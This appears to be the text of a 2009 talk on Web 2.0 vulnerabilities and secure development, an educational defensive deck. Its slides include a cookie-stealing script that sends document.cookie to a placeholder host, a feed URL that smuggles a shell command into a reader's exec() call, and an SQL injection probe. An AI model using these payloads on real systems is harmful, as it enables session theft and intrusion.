XSS Worms
Samy is old, tell me about something new!
StalkDaily Worm, Twitter 11th April 2009
XSS Worms
Users web page field not sanitising input correctly:
var xss = urlencode('http://www.stalkdaily.com">"); 
document.write("");
XSS Worms
XSS Worms
How will this get worse?
•   Worms having full cross browser compatibility
•   Worms being site/flaw independent
•   Intelligent/Hybrid/Super Worms (PDP/B.Hoffman)
•   Using worm infection for DDoS
• New to Web 2.0? Yes
Feed aggregators have data coming from various 
untrusted sources. The data being received can be 
malicious and exploit users.
Feed Injections
Ninja News
http://examplesite.com
News for the discerning ninja
en-us
Wed, 10 Jun 2009 09:22:00 GMT
Fri, 12 Jun 2009 09:13:09 GMT
http://examplesite.com/blah
Editor 2
PI:EMAIL
PI:EMAIL
5
Feed Injections
Feed Injections
Remote Zone Risks
• Web browsers or web based readers in this category
• Attacks such as XSS and CSRF possible
http://example.com/news/ninja
This news is great!
Fri, 12 Jun 2009 11:42:28 GMT
http://examplesite.com/2009/06/12.html#item1
Feed Injections
&lt;script&gt;document.location=‘http://examplesite.com/cgi-
bin/cookiemonster.cgi?’+document.cookie&lt;/script&gt;
http://example.com/news/ninja
This news is great!
Fri, 12 Jun 2009 11:42:28 GMT
http://examplesite.com/2009/06/12.html#item1
Feed Injections
Feed Injections
Local Zone Risks
• The feed is written to a local HTML file
• If a vuln exists you can read from the file system
• When reading this file the reader is in the local context
Feed Injections
Yassr 0.2.2 vulnerability
• GUI.pm failed to sanitise URL’s correctly
• URL then used in exec() to launch browser
test feed
test post - create /tmp/created_file
http://www.examplesite.com";perl -e "print 'could run anything here' " 
>"/tmp/created_file
Fri, 26 Oct 2007 14:10:25 +0300
Feed Injections
Credit to Duncan Gilmore who found this vulnerability
How will this get worse?
•   Vulnerabilities in widely used readers and sites
•   Targeted data theft including key logging
•   Reconnaissance such as port scanning
Feed Injections
• New to Web 2.0? Yes
Mashups and Widgets are core components in Web 
2.0 sites. The rich functionality they provide can be 
exploited by attackers through attacks such as XSS 
and CSRF.
Mashup and Widget Hacks
Mashup and Widget Hacks
http://fo.reca.st/BreakingNewsMap/
Mashup and Widget Hacks
Mashups
Mashups site is the middleman, do you trust it?
Multiple inputs, one output
Mashup communications could leak data
Mashups require cross domain access, bye bye SOP
Mashup and Widget Hacks
http://www.google.com/ig
Mashup and Widget Hacks
Widgets
Widgets developed and uploaded by anyone
Component showing data such as news, share prices
Shared DOM model means lack of separation
Function hijacking and data theft possible
• New to Web 2.0? No
• Is this worse in Web 2.0? Yes
Applications can unintentionally leak information about 
their configuration, internal workings, or violate privacy 
through a variety of application problems.
Information Leakage
Information Leakage
A simple lack of error handling leaking information
Microsoft OLE DB Provider for ODBC 
Drivers(0x80040E14)
[Microsoft][ODBC SQL Server Driver][SQL 
Server]Invalid column name
/examplesite/login.asp, line 10
http://www.examplesite.com/home.html?day=Monday
I add a little something onto the URL
http://www.examplesite.com/home.html?day=Monday AND 
userscolumn=2
No error handling = information leakage
Information Leakage
• What makes this worse in Web 2.0?
•   WSDL files contain information that can help attackers
•   Business logic and validation moved to the client side
Information Leakage
Reading WSDL files makes recon and fingerprinting easier
Identify technologies being used, filetype:wsdl 
 (edited to protect the innocent!)
Information Leakage
Profiling and attacking is easier when you get the info up front
             Email address
Information Leakage
Web 2.0 apps will do a lot of work on the client side 
• MacWorld Conference found out the hard way in 2007
• Never assume sensitive data will be safe client side
• You need to back these up with server side checks
• Validation of data, business logic and sensitive data
• Credit to Kurt Grutzmacher
Information Leakage
• New to Web 2.0? No
• Is this worse in Web 2.0? Yes
These flaws can lead to the hijacking of user or accounts, 
privilege escalation, undermine authorization and 
accountability controls, and cause privacy violations. 
Authentication and Authorisation Flaws
Authentication and Authorisation Flaws
• Authentication and Authorisation Weaknesses
• Passwords with no max age, reasonable lengths and complexity
• Lack of brute force protection
• Broken CAPTCHA systems
• Security through obscurity
• Session Management Weaknesses
• Lack of sufficient entropy in session ID’s
• Predictable session ID’s
• Lack of sufficient timeouts and maximum lifetimes for ID’s
• Using one session ID for the whole session
Authentication and Authorisation Flaws
Facebook album security bypass
• Predictable URL used for picture album access 
• 3 parameters used in the URL
http://www.facebook.com/album.php?aid=-3&id=1508034566&l=aad9c
• aid= (the album ID) 
• id= (the user ID) 
• l= (the unique value) 
http://securityninja.co.uk/blog/?p=198 Credit to David Rook ;-) 
Authentication and Authorisation Flaws
Authentication and Authorisation Flaws
Authentication and Authorisation Flaws
Authentication and Authorisation Flaws
• What makes this worse in Web 2.0?
•   CAPTCHA’s used to provide strong A+A but are often weak 
•   More access points in Web 2.0 applications
•   The use of single sign on leads to single point of failure
•   Growth in other attacks further undermines A+A
• New to Web 2.0? No
• Is this worse in Web 2.0? Yes
These flaws could allow sensitive data to be stolen if 
the appropriate strong protections aren’t in place.  
Insecure Storage and Communications
Insecure Storage and Communications
• Insecure storage of data
• Not encrypting sensitive data
• Hard coding of keys and/or insecurely storing keys
• Using broken protection mechanisms (i.e. DES)
• Failing to rotate and manage encryption keys
• Insecure communications
• Not encrypting sensitive data in transit
• Only using SSL/TLS for the initial logon request
• Failing to protect keys whilst in transit
• Emailing clear text passwords
Insecure Storage and Communications
• What makes this worse in Web 2.0?
•   More data in more places, including client side storage
•   Mixing secure and insecure content on a page
• More code and complexity in Web 2.0 apps
Security analysis difficulties with Web 2.0
• At least two languages to analyse (client and server)
• User supplied code might never be reviewed
• Dynamic nature increases risk of missing flaws
• Increased amount of input points
How can you prevent these vulnerabilities?
• Follow a small, repeatable set of principles
• Try not to focus on specific vulnerabilities
• Develop securely, not to prevent “hot vuln of the day”
• Build security into the code, don’t try to bolt it on at 
the end
• Input Validation
–
XSS, * Injection
• Output Validation
–
XSS, * Injection, Encoding issues
• Error Handling
–
Information Leakage
• Authentication and Authorisation
–
Weak Access Control, Insufficient A+A, CSRF
• Session Management
–
Timeouts, Strong Session ID’s, CSRF
• Secure Communications
–
Strong Protection in Transit
• Secure Storage
–
Strong Protection when Stored
• Secure Resource Access
–
Restrict Access to Sensitive Resources, Admin Pages, File Systems
The Secure Development Principles
Review code 
for flaws
Check for:
Input Validation
Error Handling
Secure Storage
etc, etc
Try to hack 
it!
Manual and 
automated tests
Use tests defined 
in your threat 
model
Secure 
Development
Build security in
Security is part of 
the apps DNA
Plan to build 
security in
Threat Model
Design app to 
eliminate threats
Code
Review
Security
Testing
Requirements
Design
Secure
Development
How can you prevent these vulnerabilities?
1
2
3
4
www.securityninja.co.uk
www.securedevelopment.co.uk